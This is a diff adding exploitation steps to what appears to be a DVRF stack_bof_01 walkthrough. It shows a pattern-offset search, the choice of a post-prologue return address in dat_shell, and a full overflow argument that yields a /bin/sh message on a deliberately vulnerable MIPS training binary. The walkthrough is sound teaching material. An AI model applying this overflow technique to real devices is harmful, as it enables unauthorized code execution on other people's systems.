@@ -117,7 +117,7 @@ Welcome to the first BoF exercise!
 You entered test123 
 Try Again
 ```
-####  2. Remote debugging with gdb-multiarch 
+####  3. Remote debugging with gdb-multiarch 
 The program is emulated again, now with the parameter AAAA and the option "-g 1234", meaning that the file is going to be debugged remotely at port 1234:
 ```console
 $ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 AAAA
@@ -158,7 +158,7 @@ Welcome to the first BoF exercise!
 You entered AAAA 
 Try Again
 ```
-#### 3. Preparing the attack
+#### 4. Preparing the attack
 Now, in order to prepare the attack, let's examine the functions of the binary. Specifically, because we are interested to control the flow of the program to execute the function dat_shell, let's notice that this function starts at 0x004000950:
 ```console
 (gdb) info functions 
@@ -243,8 +243,80 @@ Examining the registers, we see that the PC (Program Counter) has been overwritt
       00000000 00739300 
 (gdb) 
 ```
+Converting the hexadecimal number 0x41386741 into ASCII we get A8gA.After reversing A8gA to Ag8A, locating it into the pattern, there is an offset of 204:
+```console
+$ ./pattern.pl 300 Ag8A
 
+Generate/Search Pattern 
+Scripted by Wasim Halani (washal)
+https://securitythoughts.wordpress.com/
+Version 0.2
 
+String is : 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+
+Pattern 'Ag8A' found at offset(s) : 204 
+```
+####  5. Launching the exploitation
+The key concept to perform the attack is that the buffer must be rewriten with the first 204 characters (all characters before Ag8A) followed by the address of the function **dat_shell()**
+<br/>
+Now, creating a new pattern of just 204 characters and copying them:
+```console
+$ ./pattern.pl 204     
+
+Generate/Search Pattern 
+Scripted by Wasim Halani (washal)
+https://securitythoughts.wordpress.com/
+Version 0.2
+
+String is : 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7
+```
+This line grows the stack by an unsigned immediate (8) from the current stack pointer memory location (sp) and stores the new memory address in the stack pointer register. In this case, the stack pointer is going to decrease by 8 toward zero.
+Instead of choosing the beginning address of **dat_shell()**, let's pick four more advance instructions (0x0040095c). Otherwise the exploit does not work. We needto give the address after function prologue.
+```console
+(gdb) disas dat_shell 
+Dump of assembler code for function dat_shell:
+   0x00400950 <+0>:	lui	gp,0x5
+   0x00400954 <+4>:	addiu	gp,gp,-31872
+   0x00400958 <+8>:	addu	gp,gp,t9
+   0x0040095c <+12>:	addiu	sp,sp,-32
+   0x00400960 <+16>:	sw	ra,28(sp)
+   0x00400964 <+20>:	sw	s8,24(sp)
+   0x00400968 <+24>:	move	s8,sp
+```
+Crafting a new parameter, composed of the 204 set of characters of the pattern, plus echoing 0x0040095c in a **Little Indian** format with option **-e**, to enable the interpretation of backslash escapes.
+<br/>
+Let's pass the argument to the program:
+```console
+$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"
+```
+Remote debugging again and remote debugging again:
+```console
+(gdb) target remote 127.0.0.1:1234
+Remote debugging using 127.0.0.1:1234
+Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x7f7b9a80 in _start ()
+   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0
+(gdb) c
+Continuing.
+[Inferior 1 (Remote target) exited normally]
+(gdb) 
+```
+At this point the registers PC has been loaded with the function **dat_shell()**.
+<br/>
+Eventually the buffer overflow attack is successful because dat_shell() function is executed
+```console
+$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"
+Welcome to the first BoF exercise!
+
+You entered Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7\	@ 
+Try Again
+Congrats! I will now execute /bin/sh
+- b1ack0wl
+```
 
 
 
